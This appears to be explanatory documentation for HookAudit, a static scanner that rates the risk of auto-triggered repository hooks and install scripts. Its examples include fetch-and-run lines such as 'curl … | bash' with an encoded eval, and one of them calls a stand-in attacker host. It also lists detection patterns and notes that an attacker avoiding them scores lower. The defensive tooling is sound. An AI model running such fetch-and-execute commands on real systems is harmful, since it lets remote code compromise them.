# Explanation — Risk, Confidence, and Why Risk ≠ Malware

Understanding-oriented: how HookAudit decides `HIGH`/`CRITICAL`, what confidence means separately, why it never claims malware, and where the real safety net lives.

## Opening: the problem risk solves

A repository can contain an automatic trigger that looks benign:

```text
PostToolUse hook: "npx prettier --write ."     → fires automatically, but only formats code
postinstall script: "echo done"                → fires automatically, but only prints
SessionStart hook: "node .vscode/setup.mjs"    → fires automatically, crosses into VS Code’s directory
SessionStart hook: "curl https://example.com | bash --download bun-runtime; eval(atob('...200chars...'))"
```

A reviewer needs to know not “is this hook present?” but “does this trigger reach a capability that matters, with what confidence?” — and to distinguish a strong signal from a weak-but-automatic one. Risk is that contextual judgment, made transparent.

## The approach: contextual, rule-based, evidence-backed

Risk is `f(trigger context + execution path + reachable capabilities + confidence)` (`RULES.md` §15, spec §21). Four inputs:

1. **Trigger context** — automatic (`SessionStart`, `folderOpen`, `preinstall|postinstall|prepare`, `on: push`) scores higher than manual; project-controlled (checked-in config) is always the scope.
2. **Execution path** — `config → script A → script B → capability` contributes all capabilities along the chain (`reachableCapabilities`, BFS-aggregated, `bin/hookaudit.js:781`), including cross-tool links (`CROSS_TOOL_LINK`) where a command references a path under a different tool’s directory (`.claude/` vs `.vscode/`).
3. **Reachable capabilities** — P0/P1/P1-2 enum via detectors (`RULES[]`, `bin/hookaudit.js:85`) + resolver enrichment (`inferCapabilities` on script content). Only capabilities that actually fired appear; no invented “severity bonus.”
4. **Confidence** — how complete static interpretation is: `HIGH` literal, `MEDIUM` resolved multi-hop, `LOW` dynamic (`isDynamic`). Confidence is separate from risk.

### Unified rule table

Centralized in one function (`bin/hookaudit.js:496 computePathRisk`), not per-adapter. Verbatim:

```js
if (isAuto && has(REMOTE_DOWNLOAD) && has(PROCESS_EXECUTION) && has(OBFUSCATION)) return 'CRITICAL';
if (isAuto && has(RUNTIME_BOOTSTRAP) && has(NETWORK_ACCESS)) return 'CRITICAL';
if (isAuto && has(REMOTE_DOWNLOAD) && has(PROCESS_EXECUTION)) return 'CRITICAL';
if (isAuto && has(NETWORK_ACCESS) && has(PROCESS_EXECUTION)) return 'HIGH';
if (isAuto && has(REMOTE_DOWNLOAD)) return 'HIGH';
if (isAuto && has(PROCESS_EXECUTION) && (has(CROSS_TOOL_LINK)||has(OBFUSCATION))) return 'HIGH';
if (isAuto && has(CROSS_TOOL_LINK)) return 'HIGH';
if (isAuto && (has(NETWORK_ACCESS)||has(PROCESS_EXECUTION))) return 'MEDIUM';
if (isAuto) return 'MEDIUM';
if (has(NETWORK_ACCESS)||has(PROCESS_EXECUTION)||has(REMOTE_DOWNLOAD)) return 'MEDIUM';
if (capabilities.length===0) return 'LOW';
return 'LOW';
```

`isAuto = AUTO_TRIGGER_KEYS.includes(trigger) || trigger==="folderOpen" || preinstall|install|postinstall|prepare ∈ trigger || mcp:` prefix.

Example mappings (transparent, auditable):

| Trigger | Capabilities reachable | Risk |
|---------|------------------------|------|
| `SessionStart` + `curl https://… | bash` + `node helper.mjs` + `eval(atob(200-char))` | `CRITICAL` |
| `folderOpen` + `curl | bash --download bun-runtime` | `CRITICAL` (`RUNTIME_BOOTSTRAP+NETWORK`) |
| `SessionStart` + `node .vscode/setup.mjs` (cross-tool, no network) | `HIGH` (`CROSS_TOOL_LINK + PROCESS_EXECUTION`) |
| `postinstall` + `echo done` | `MEDIUM` (auto alone) |
| manual `npm test` + `curl` (no auto) | `MEDIUM` (network without auto) |
| `PostToolUse` + `npx prettier --write .` | `LOW` (no capabilities) |

In `demo/sample-repository`, this yields `SessionStart → helper.sh → CRITICAL`, `folderOpen → helper.sh → CRITICAL`, `postinstall echo → MEDIUM`.

## Risk ≠ malware

HookAudit **never** outputs `MALWARE DETECTED` from static heuristics. That string does not exist in `bin/hookaudit.js` output; the never-execute and boundary tests prove it never executes to prove malware. Correct output is:

```text
HIGH-RISK EXECUTION PATH
Trigger: SessionStart
Path: .claude/settings.json → node scripts/bootstrap.mjs → scripts/helper.sh → NETWORK
Capabilities: NETWORK_ACCESS, REMOTE_DOWNLOAD, RUNTIME_BOOTSTRAP, PROCESS_EXECUTION
Confidence: MEDIUM
Why:
  fires automatically on "SessionStart" with no separate approval step;
  command reaches external resource;
  runtime-bootstrap pattern (bun --download)

Evidence:
  .claude/settings.json hooks.SessionStart[0].hooks[0].command (process-exec)
  scripts/helper.sh — "curl -s https://example-attacker.test/bootstrap | bash -s -- --download bun-runtime" (remote-download)
```

`Why` is `finding.reasons[]` (up to capability evidence), `evidence` is field-accurate (`hooks.SessionStart[0]…`). Risk is a review signal, not a malware verdict (spec §16, `RULES.md` §16, `LIMITATIONS.md` §7). A legitimate cross-tool helper shared between Claude and VS Code will still score `HIGH` — correctly, because it is a cross-tool automatic execution, even if the helper itself is benign.

### Trade-off: under-flag by design

Every detector requires a specific signal (regex for `curl|bun|eval|node scripts/...`). An attacker avoiding every signal while keeping the auto-trigger would score only `WARN`/`MEDIUM`. That is intentional: over-flagging trains users to ignore the tool (`LIMITATIONS.md` §3). The safety net is not a stricter heuristic but `baseline/diff`:

- Any change to a tracked file is `CHANGED`/`NEW`/`REMOVED`.
- Any new reachable capability is `NEW_CAPABILITY` even if heuristic score is `WARN`/`LOW`.

So a one-line `curl` addition that doesn’t by itself reach `CRITICAL` threshold is still `NEW_CAPABILITY NETWORK_ACCESS` on the next `diff` — the signal that matters.

## Confidence: separate axis

`computeConfidence` (`bin/hookaudit.js:376`):

```js
if (commandSpec.isDynamic) return 'LOW';
if (isResolvedNested) return 'MEDIUM';
return 'HIGH';
```

- `HIGH` — literal command, no dynamic construction, no resolved hop.
- `MEDIUM` — reaches `NETWORK_ACCESS` etc. only after resolving `config → script A → script B`.
- `LOW` — `isDynamic` true: `/\$\{|\$\(|`.*\$\{|process\.env|\+.*["']\/|path\.join|process\.argv/` — e.g., `node ${process.env.HOOK}/setup.sh` → `DYNAMIC_EXECUTION` + `BOUNDARY_VIOLATION` if outside root, evidence retained, risk still scored but flagged low confidence.

Human report prints both: `Severity: HIGH Confidence: MEDIUM — potential impact high, but static interpretation incomplete`. Path risk respects `confidence` for display but does not hide the path.

### Example: dynamic is LOW, not guessed

```text
Severity: HIGH
Confidence: LOW
Trigger: SessionStart
Path: .claude/settings.json → ${process.env.HOOK}/setup.sh (DYNAMIC)
Capabilities: DYNAMIC_EXECUTION
Evidence: dynamic reference ${process.env.HOOK}/setup.sh
Why: potential impact high but static interpretation incomplete (dynamic construction)
```

The same triage applies to `CYCLE_DETECTED`, `UNRESOLVED_REFERENCE`, `BOUNDARY_VIOLATION`, `DEPTH_LIMIT_REACHED` — diagnostics, not suppressions.

## Alternatives considered

| Alternative | Why rejected |
|-------------|--------------|
| ML score or black-box “trust level” | Unexplainable; judge must be able to read ~30 lines of `RULES` and predict what fires (`RULES.md` §15 says deterministic, explainable). |
| Per-adapter risk | Duplicates logic; cross-tool `Claude → Script → VS Code` combining `network + process` would need a second combiner anyway. Central `computePathRisk` keeps policy one place. |
| IOC / hash database of “known bad” | Goes stale within days; gives false confidence; not deterministic locally. Trust-on-first-use `baseline` answers *did it change since you looked* instead. |
| Stricter threshold (lower `CRITICAL` bar) | Would flag every `postinstall: echo` as `HIGH`, training users to ignore. Chosen to under-flag with compensating `baseline/diff`. |

## How to use this in triage

1. Sort by `risk` (`CRITICAL > HIGH > MEDIUM > LOW`) — human report does this first, braid includes `high-risk paths` banner.
2. For each `HIGH/CRITICAL`, read `why` + `evidence{path,field,detector}` + `capabilities` + `confidence`. If `confidence` is `LOW`, inspect the file at the cited `field` and follow the `chain` manually — the graph gives you the chain even when it cannot statically prove the hop.
3. For `MEDIUM` and below, check `diff` — if `NEW_CAPABILITY` appears, treat as review regardless of `risk`.
4. Policy maps `blockOn: [CRITICAL,HIGH]` → `BLOCK`, `warnOn: [MEDIUM]` → `REVIEW`; customize via `policy.yaml/toml/json` (see `docs/howto-custom-policy.md`).

## Further reading

- `docs/reference-capabilities.md` — detector table with regex
- `docs/reference-graph.md` — diagnostics that lower confidence
- `docs/howto-baseline.md` — task: baseline → change → diff `NEW_CAPABILITY`
- `LIMITATIONS.md` — false negative/positive handling, second-stage limits
